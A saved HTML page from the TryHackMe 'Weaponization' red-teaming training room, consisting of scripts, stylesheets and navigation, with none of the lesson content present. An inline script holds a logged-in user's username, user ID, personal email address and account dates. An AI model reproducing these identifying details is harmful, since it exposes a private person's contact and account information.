<!DOCTYPE html>
<!-- saved from url=(0040)https://tryhackme.com/room/weaponization -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>TryHackMe | Weaponization </title>
<meta name="description" content="Understand and explore common red teaming weaponization techniques. You will learn to build custom payloads using common methods seen in the industry to get initial access.">
<meta name="og:description" content="Understand and explore common red teaming weaponization techniques. You will learn to build custom payloads using common methods seen in the industry to get initial access.">
<meta name="keywords" content="cyber,security,cyber security,cyber security training,coding,computer,bitcoin,hacking,hackers,hacks,hack,exploits,keylogger,learn,poc">
<meta name="viewport" content="width=device-width,initial-scale=1.0">

<meta property="og:site_name" content="TryHackMe">
<meta property="og:title" content="TryHackMe | Weaponization ">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/6237ff0116023ea927d5f669af6d29bc.png">
<meta property="og:url" content="https://tryhackme.com/room/weaponization">
<meta name="twitter:image" content="https://tryhackme.com/img/meta/default.png">
<meta property="og:description" content="Understand and explore common red teaming weaponization techniques. You will learn to build custom payloads using common methods seen in the industry to get initial access.">

<script type="text/javascript" async="" src="./TryHackMe _ Weaponization_files/pgpbhph6"></script><script src="./TryHackMe _ Weaponization_files/jquery.min.js"></script>
<script src="./TryHackMe _ Weaponization_files/popper.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Weaponization_files/boostrap431.min.css">
<script src="./TryHackMe _ Weaponization_files/bootstrap431.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Weaponization_files/animate.min.css">
<link rel="stylesheet" href="./TryHackMe _ Weaponization_files/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
<link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png">
<link rel="stylesheet" media="screen" href="./TryHackMe _ Weaponization_files/general-style.css">
<script src="./TryHackMe _ Weaponization_files/script.js"></script>
<script src="./TryHackMe _ Weaponization_files/validation.js"></script>

<link rel="stylesheet" type="text/css" href="./TryHackMe _ Weaponization_files/cookieconsent.min.css">
<script src="./TryHackMe _ Weaponization_files/cookieconsent.min.js"></script>
<script async="" src="./TryHackMe _ Weaponization_files/js"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
  
    gtag('config', 'G-Z8D4WL3D4P');
  </script>


<script>
    window.intercomSettings = {
      api_base: "https://api-iam.intercom.io",
      app_id: "pgpbhph6"
    };
  </script>
<script>
    (function (h, o, t, j, a, r) {
      h.hj = h.hj || function () { (h.hj.q = h.hj.q || []).push(arguments) };
      h._hjSettings = { hjid: 1950941, hjsv: 6 };
      a = o.getElementsByTagName('head')[0];
      r = o.createElement('script'); r.async = 1;
      r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
      a.appendChild(r);
    })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
  </script><script async="" src="./TryHackMe _ Weaponization_files/hotjar-1950941.js"></script>
<script>
    /* Global javascript variables */

    // Used inside script.js for createRooms compelted users.
    const username = 'Silv3rsurf3r'
    const subscribed = '1'
    const level = '10'
    const intercomEnabled = 'true'
  </script>
<script>
    //add back tracking info
    const userId = "63d14e7f857ae10041bb192f"
    let tutorialComplete = false
    if ('false' == "true") {
      tutorialComplete = true
    }
    if(intercomEnabled === "true"){
      window.intercomSettings = {
        api_base: "https://api-iam.intercom.io",
        app_id: "pgpbhph6",
        user_id: userId,
        username: username,
        email: "giftonpaul@karunya.edu.in",
        created_at: Math.floor(new Date("Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)").getTime() / 1000) // Signup date as a Unix timestamp
      };
    }
    window.hj('identify', userId, {
      displayName: username,
      subscribed: "1",
      dateSignUp: "Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)",
      experience: "advanced"
    })
  </script>
<script type="application/ld+json">

   {
      "@context":"https://schema.org",
      "@type":"Organization",
      "url":"https://tryhackme.com",
      "name":"TryHackMe",
      "logo":"https://tryhackme.com/img/favicon.png",
      "description":"TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!",
      "email": "support@tryhackme.com",
      "sameAs":[
         "https://www.linkedin.com/company/tryhackme",
         "https://twitter.com/realtryhackme"
      ]
   }

</script>
<script>
    console.log(`%c
      ------------------
      < Happy Hacking! >
      ------------------
              \\   ^__^
               \\  (oo)\\_______
                  (__)\\       )\\/\\
                      ||----w |
                      ||     ||`, "font-family:monospace")
  </script>
<script>
  (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/pgpbhph6';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(document.readyState==='complete'){l();}else if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
</script>
<script src="./TryHackMe _ Weaponization_files/socket.io.js"></script><script>
  let socket = io.connect({
    transports: ['websocket'],
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionAttempts: 10
  })
</script><style type="text/css">.apexcharts-canvas {
  position: relative;
  user-select: none;
  /* cannot give overflow: hidden as it will crop tooltips which overflow outside chart area */
}


/* scrollbar is not visible by default for legend, hence forcing the visibility */
.apexcharts-canvas ::-webkit-scrollbar {
  -webkit-appearance: none;
  width: 6px;
}

.apexcharts-canvas ::-webkit-scrollbar-thumb {
  border-radius: 4px;
  background-color: rgba(0, 0, 0, .5);
  box-shadow: 0 0 1px rgba(255, 255, 255, .5);
  -webkit-box-shadow: 0 0 1px rgba(255, 255, 255, .5);
}


.apexcharts-inner {
  position: relative;
}

.apexcharts-text tspan {
  font-family: inherit;
}

.legend-mouseover-inactive {
  transition: 0.15s ease all;
  opacity: 0.20;
}

.apexcharts-series-collapsed {
  opacity: 0;
}

.apexcharts-tooltip {
  border-radius: 5px;
  box-shadow: 2px 2px 6px -4px #999;
  cursor: default;
  font-size: 14px;
  left: 62px;
  opacity: 0;
  pointer-events: none;
  position: absolute;
  top: 20px;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  white-space: nowrap;
  z-index: 12;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-theme-light {
  border: 1px solid #e3e3e3;
  background: rgba(255, 255, 255, 0.96);
}

.apexcharts-tooltip.apexcharts-theme-dark {
  color: #fff;
  background: rgba(30, 30, 30, 0.8);
}

.apexcharts-tooltip * {
  font-family: inherit;
}


.apexcharts-tooltip-title {
  padding: 6px;
  font-size: 15px;
  margin-bottom: 4px;
}

.apexcharts-tooltip.apexcharts-theme-light .apexcharts-tooltip-title {
  background: #ECEFF1;
  border-bottom: 1px solid #ddd;
}

.apexcharts-tooltip.apexcharts-theme-dark .apexcharts-tooltip-title {
  background: rgba(0, 0, 0, 0.7);
  border-bottom: 1px solid #333;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  display: inline-block;
  font-weight: 600;
  margin-left: 5px;
}

.apexcharts-tooltip-text-y-label:empty,
.apexcharts-tooltip-text-y-value:empty,
.apexcharts-tooltip-text-goals-label:empty,
.apexcharts-tooltip-text-goals-value:empty,
.apexcharts-tooltip-text-z-value:empty {
  display: none;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  font-weight: 600;
}

.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-goals-group, 
.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  display: flex;
}
.apexcharts-tooltip-text-goals-label:not(:empty),
.apexcharts-tooltip-text-goals-value:not(:empty) {
  margin-top: -6px;
}

.apexcharts-tooltip-marker {
  width: 12px;
  height: 12px;
  position: relative;
  top: 0px;
  margin-right: 10px;
  border-radius: 50%;
}

.apexcharts-tooltip-series-group {
  padding: 0 10px;
  display: none;
  text-align: left;
  justify-content: left;
  align-items: center;
}

.apexcharts-tooltip-series-group.apexcharts-active .apexcharts-tooltip-marker {
  opacity: 1;
}

.apexcharts-tooltip-series-group.apexcharts-active,
.apexcharts-tooltip-series-group:last-child {
  padding-bottom: 4px;
}

.apexcharts-tooltip-series-group-hidden {
  opacity: 0;
  height: 0;
  line-height: 0;
  padding: 0 !important;
}

.apexcharts-tooltip-y-group {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-box, .apexcharts-custom-tooltip {
  padding: 4px 8px;
}

.apexcharts-tooltip-boxPlot {
  display: flex;
  flex-direction: column-reverse;
}

.apexcharts-tooltip-box>div {
  margin: 4px 0;
}

.apexcharts-tooltip-box span.value {
  font-weight: bold;
}

.apexcharts-tooltip-rangebar {
  padding: 5px 8px;
}

.apexcharts-tooltip-rangebar .category {
  font-weight: 600;
  color: #777;
}

.apexcharts-tooltip-rangebar .series-name {
  font-weight: bold;
  display: block;
  margin-bottom: 5px;
}

.apexcharts-xaxistooltip {
  opacity: 0;
  padding: 9px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
  transition: 0.15s ease all;
}

.apexcharts-xaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-xaxistooltip:after,
.apexcharts-xaxistooltip:before {
  left: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-xaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-left: -6px;
}

.apexcharts-xaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-left: -7px;
}

.apexcharts-xaxistooltip-bottom:after,
.apexcharts-xaxistooltip-bottom:before {
  bottom: 100%;
}

.apexcharts-xaxistooltip-top:after,
.apexcharts-xaxistooltip-top:before {
  top: 100%;
}

.apexcharts-xaxistooltip-bottom:after {
  border-bottom-color: #ECEFF1;
}

.apexcharts-xaxistooltip-bottom:before {
  border-bottom-color: #90A4AE;
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:after {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:before {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top:after {
  border-top-color: #ECEFF1
}

.apexcharts-xaxistooltip-top:before {
  border-top-color: #90A4AE;
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:after {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:before {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-yaxistooltip {
  opacity: 0;
  padding: 4px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
}

.apexcharts-yaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-yaxistooltip:after,
.apexcharts-yaxistooltip:before {
  top: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-yaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-top: -6px;
}

.apexcharts-yaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-top: -7px;
}

.apexcharts-yaxistooltip-left:after,
.apexcharts-yaxistooltip-left:before {
  left: 100%;
}

.apexcharts-yaxistooltip-right:after,
.apexcharts-yaxistooltip-right:before {
  right: 100%;
}

.apexcharts-yaxistooltip-left:after {
  border-left-color: #ECEFF1;
}

.apexcharts-yaxistooltip-left:before {
  border-left-color: #90A4AE;
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:after {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:before {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right:after {
  border-right-color: #ECEFF1;
}

.apexcharts-yaxistooltip-right:before {
  border-right-color: #90A4AE;
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:after {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:before {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip.apexcharts-active {
  opacity: 1;
}

.apexcharts-yaxistooltip-hidden {
  display: none;
}

.apexcharts-xcrosshairs,
.apexcharts-ycrosshairs {
  pointer-events: none;
  opacity: 0;
  transition: 0.15s ease all;
}

.apexcharts-xcrosshairs.apexcharts-active,
.apexcharts-ycrosshairs.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-ycrosshairs-hidden {
  opacity: 0;
}

.apexcharts-selection-rect {
  cursor: move;
}

.svg_select_boundingRect, .svg_select_points_rot {
  pointer-events: none;
  opacity: 0;
  visibility: hidden;
}
.apexcharts-selection-rect + g .svg_select_boundingRect,
.apexcharts-selection-rect + g .svg_select_points_rot {
  opacity: 0;
  visibility: hidden;
}

.apexcharts-selection-rect + g .svg_select_points_l,
.apexcharts-selection-rect + g .svg_select_points_r {
  cursor: ew-resize;
  opacity: 1;
  visibility: visible;
}

.svg_select_points {
  fill: #efefef;
  stroke: #333;
  rx: 2;
}

.apexcharts-svg.apexcharts-zoomable.hovering-zoom {
  cursor: crosshair
}

.apexcharts-svg.apexcharts-zoomable.hovering-pan {
  cursor: move
}

.apexcharts-zoom-icon,
.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon,
.apexcharts-reset-icon,
.apexcharts-pan-icon,
.apexcharts-selection-icon,
.apexcharts-menu-icon,
.apexcharts-toolbar-custom-icon {
  cursor: pointer;
  width: 20px;
  height: 20px;
  line-height: 24px;
  color: #6E8192;
  text-align: center;
}

.apexcharts-zoom-icon svg,
.apexcharts-zoomin-icon svg,
.apexcharts-zoomout-icon svg,
.apexcharts-reset-icon svg,
.apexcharts-menu-icon svg {
  fill: #6E8192;
}

.apexcharts-selection-icon svg {
  fill: #444;
  transform: scale(0.76)
}

.apexcharts-theme-dark .apexcharts-zoom-icon svg,
.apexcharts-theme-dark .apexcharts-zoomin-icon svg,
.apexcharts-theme-dark .apexcharts-zoomout-icon svg,
.apexcharts-theme-dark .apexcharts-reset-icon svg,
.apexcharts-theme-dark .apexcharts-pan-icon svg,
.apexcharts-theme-dark .apexcharts-selection-icon svg,
.apexcharts-theme-dark .apexcharts-menu-icon svg,
.apexcharts-theme-dark .apexcharts-toolbar-custom-icon svg {
  fill: #f3f4f5;
}

.apexcharts-canvas .apexcharts-zoom-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-selection-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-reset-zoom-icon.apexcharts-selected svg {
  fill: #008FFB;
}

.apexcharts-theme-light .apexcharts-selection-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoom-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoomin-icon:hover svg,
.apexcharts-theme-light .apexcharts-zoomout-icon:hover svg,
.apexcharts-theme-light .apexcharts-reset-icon:hover svg,
.apexcharts-theme-light .apexcharts-menu-icon:hover svg {
  fill: #333;
}

.apexcharts-selection-icon,
.apexcharts-menu-icon {
  position: relative;
}

.apexcharts-reset-icon {
  margin-left: 5px;
}

.apexcharts-zoom-icon,
.apexcharts-reset-icon,
.apexcharts-menu-icon {
  transform: scale(0.85);
}

.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon {
  transform: scale(0.7)
}

.apexcharts-zoomout-icon {
  margin-right: 3px;
}

.apexcharts-pan-icon {
  transform: scale(0.62);
  position: relative;
  left: 1px;
  top: 0px;
}

.apexcharts-pan-icon svg {
  fill: #fff;
  stroke: #6E8192;
  stroke-width: 2;
}

.apexcharts-pan-icon.apexcharts-selected svg {
  stroke: #008FFB;
}

.apexcharts-pan-icon:not(.apexcharts-selected):hover svg {
  stroke: #333;
}

.apexcharts-toolbar {
  position: absolute;
  z-index: 11;
  max-width: 176px;
  text-align: right;
  border-radius: 3px;
  padding: 0px 6px 2px 6px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.apexcharts-menu {
  background: #fff;
  position: absolute;
  top: 100%;
  border: 1px solid #ddd;
  border-radius: 3px;
  padding: 3px;
  right: 10px;
  opacity: 0;
  min-width: 110px;
  transition: 0.15s ease all;
  pointer-events: none;
}

.apexcharts-menu.apexcharts-menu-open {
  opacity: 1;
  pointer-events: all;
  transition: 0.15s ease all;
}

.apexcharts-menu-item {
  padding: 6px 7px;
  font-size: 12px;
  cursor: pointer;
}

.apexcharts-theme-light .apexcharts-menu-item:hover {
  background: #eee;
}

.apexcharts-theme-dark .apexcharts-menu {
  background: rgba(0, 0, 0, 0.7);
  color: #fff;
}

@media screen and (min-width: 768px) {
  .apexcharts-canvas:hover .apexcharts-toolbar {
    opacity: 1;
  }
}

.apexcharts-datalabel.apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-pie-label,
.apexcharts-datalabels,
.apexcharts-datalabel,
.apexcharts-datalabel-label,
.apexcharts-datalabel-value {
  cursor: default;
  pointer-events: none;
}

.apexcharts-pie-label-delay {
  opacity: 0;
  animation-name: opaque;
  animation-duration: 0.3s;
  animation-fill-mode: forwards;
  animation-timing-function: ease;
}

.apexcharts-canvas .apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-hide .apexcharts-series-points {
  opacity: 0;
}

.apexcharts-gridline,
.apexcharts-annotation-rect,
.apexcharts-tooltip .apexcharts-marker,
.apexcharts-area-series .apexcharts-area,
.apexcharts-line,
.apexcharts-zoom-rect,
.apexcharts-toolbar svg,
.apexcharts-area-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-line-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-radar-series path,
.apexcharts-radar-series polygon {
  pointer-events: none;
}


/* markers */

.apexcharts-marker {
  transition: 0.15s ease all;
}

@keyframes opaque {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}


/* Resize generated styles */

@keyframes resizeanim {
  from {
    opacity: 0;
  }
  to {
    opacity: 0;
  }
}

.resize-triggers {
  animation: 1ms resizeanim;
  visibility: hidden;
  opacity: 0;
}

.resize-triggers,
.resize-triggers>div,
.contract-trigger:before {
  content: " ";
  display: block;
  position: absolute;
  top: 0;
  left: 0;
  height: 100%;
  width: 100%;
  overflow: hidden;
}

.resize-triggers>div {
  background: #eee;
  overflow: auto;
}

.contract-trigger:before {
  width: 200%;
  height: 200%;
}</style><style data-jss="" data-meta="MuiDialog">
@media print {
  .MuiDialog-root {
    position: absolute !important;
  }
}
.MuiDialog-scrollPaper {
  display: flex;
  align-items: center;
  justify-content: center;
}
.MuiDialog-scrollBody {
  overflow-x: hidden;
  overflow-y: auto;
  text-align: center;
}
.MuiDialog-scrollBody:after {
  width: 0;
  height: 100%;
  content: "";
  display: inline-block;
  vertical-align: middle;
}
.MuiDialog-container {
  height: 100%;
  outline: 0;
}
@media print {
  .MuiDialog-container {
    height: auto;
  }
}
.MuiDialog-paper {
  margin: 32px;
  position: relative;
  overflow-y: auto;
}
@media print {
  .MuiDialog-paper {
    box-shadow: none;
    overflow-y: visible;
  }
}
.MuiDialog-paperScrollPaper {
  display: flex;
  max-height: calc(100% - 64px);
  flex-direction: column;
}
.MuiDialog-paperScrollBody {
  display: inline-block;
  text-align: left;
  vertical-align: middle;
}
.MuiDialog-paperWidthFalse {
  max-width: calc(100% - 64px);
}
.MuiDialog-paperWidthXs {
  max-width: 444px;
}
@media (max-width:507.95px) {
  .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthSm {
  max-width: 600px;
}
@media (max-width:663.95px) {
  .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthMd {
  max-width: 960px;
}
@media (max-width:1023.95px) {
  .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthLg {
  max-width: 1280px;
}
@media (max-width:1343.95px) {
  .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthXl {
  max-width: 1920px;
}
@media (max-width:1983.95px) {
  .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperFullWidth {
  width: calc(100% - 64px);
}
.MuiDialog-paperFullScreen {
  width: 100%;
  height: 100%;
  margin: 0;
  max-width: 100%;
  max-height: none;
  border-radius: 0;
}
.MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
  margin: 0;
  max-width: 100%;
}
</style><script async="" src="./TryHackMe _ Weaponization_files/modules.5957fbf26d1b525b5a12.js" charset="utf-8"></script><style></style></head>


<body><div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override-382972913 cc-invisible" style="display: none;"><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">We use cookies to ensure you get the best user experience. For more information contact us. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://tryhackme.com/legal/terms-of-use" target="_blank">Read more</a></span><div class="cc-compliance"><a aria-label="dismiss cookie message" role="button" tabindex="0" class="cc-btn cc-dismiss">Got it!</a></div><!--googleon: all--></div>
<link href="./TryHackMe _ Weaponization_files/scoreboard.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Weaponization_files/introjs.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Weaponization_files/slideout.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Weaponization_files/public-rooms.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Weaponization_files/asciinema-player.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Weaponization_files/prism.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Weaponization_files/magnific-popup.css" rel="stylesheet" type="text/css"> 
<script src="./TryHackMe _ Weaponization_files/lottie-player.js"></script>

<div id="room-content">
<div id="room-content-main">
<nav class="navbar navbar-expand-md navbar-dark navbar-color-loggedin navbar-main">
<div class="container">
<button id="thm-mobile-nav-open" class="thm-nav__hamburger-btn" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Open mobile navigation">
<span class="thm-nav__hamburger-lines"></span>
</button>
<div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
<div class="navbar-brand" href="/">
<a href="https://tryhackme.com/dashboard">
<img width="115px" src="./TryHackMe _ Weaponization_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
</div>
<ul class="navbar-nav mr-auto mt-2 mt-lg-0 navbar-pagelinks">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="navbar-item-icon far fa-browser"></i>
<div class="navbar-item-text">Dashboard</div>
</a>
</li>
<li class="nav-item active" id="nav-learn">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="navbar-item-icon far fa-book-open"></i>
<div class="navbar-item-text">Learn</div>
</a>
</li>
<li class="nav-item  dropdown lite-removable">
<a id="nav-other" class="nav-link" href="https://tryhackme.com/room/weaponization#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-trophy"></i>
<div class="navbar-item-text">Compete</div>
</a>
<div class="dropdown-menu" aria-labelledby="navbarDropdown">
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/leaderboards">
<div class="dropdown-menu-icon">
<i class="fas fa-trophy"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/games/koth">
<div class="dropdown-menu-icon">
<i class="fas fa-crown"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/workspace">
<div class="dropdown-menu-icon">
<i class="fas fa-user-friends"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item dropdown">
<a data-cy="nav-other-menu-button" id="nav-other" class="nav-link" href="https://tryhackme.com/room/weaponization#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-ellipsis-h-alt"></i>
<div class="navbar-item-text">Other</div>
</a>
<div data-cy="nav-other-menu" class="dropdown-menu dropdown-menu-center large-dropdown" aria-labelledby="navbarDropdown">
<span class="dropdown-menu-arrow"></span>
<a class="dropdown-item" href="https://tryhackme.com/resources">Resources</a>
<a class="dropdown-item" href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a class="dropdown-item" href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/business">For Business</a>
<a class="dropdown-item" href="https://tryhackme.com/classrooms">For Education</a>
<a class="dropdown-item" target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
<a class="dropdown-item" href="https://tryhackme.com/glossary">Glossary</a>
</div>
</li>
</ul>
<ul class="navbar-nav navbar-right options vertical-align-custom">
<li class="nav-item" data-toggle="modal" data-target="#navConnModal">
<div id="thm-connection-status" class="thm-disconnected" style="display: flex;">
<div id="thm-connection-status-dot" class="dot-small"></div> <span id="thm-connection-status-txt" class="ml-2 size-18 text-white">Access Machines</span>
</div>
</li>
<li class="nav-item">
<div class="nav-item-streak">
<span id="streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
<span id="user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
<script>
                            let usersStreak = { // Global variable, used in rooms logic
                                streakFirstAnswered: new Date('Mon Jul 10 2023 03:13:45 GMT+0100 (British Summer Time)'),
                                streakLastAnswered: new Date('Sun Jul 16 2023 18:47:44 GMT+0100 (British Summer Time)'),
                                usersTimezone: 'Asia/Kolkata',
                                streakFreeze: 1
                            };
                            setSidebarStreaks(usersStreak.streakFirstAnswered, usersStreak.streakLastAnswered, usersStreak.usersTimezone, usersStreak.streakFreeze)
                        </script>
</div>
</li>
<li class="nav-item dropdown" id="notification-navitem">
<a class="nav-link vertical-align-custom size-22 pl-0" href="https://tryhackme.com/room/weaponization#" id="notification-btn" role="button" data-toggle="dropdown">
<i id="notification-icon" class="fal fa-bell"></i>
<div id="notification-dot"></div>
</a>
<div id="nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="notification-header">Notifications</div>
<div id="nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item dropdown">
<a class="nav-link dropdown-toggle remove-arrow p-0" href="https://tryhackme.com/room/weaponization#" id="navbarAvatarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
<img src="./TryHackMe _ Weaponization_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarAvatarDropdown">
<a class="dropdown-item" href="https://tryhackme.com/profile">Profile</a>
<a class="dropdown-item" href="https://tryhackme.com/referrals">Refer a friend</a>
<a class="dropdown-item" href="https://tryhackme.com/badges">Badges</a>
<a class="dropdown-item" href="https://tryhackme.com/rooms">My Rooms</a>
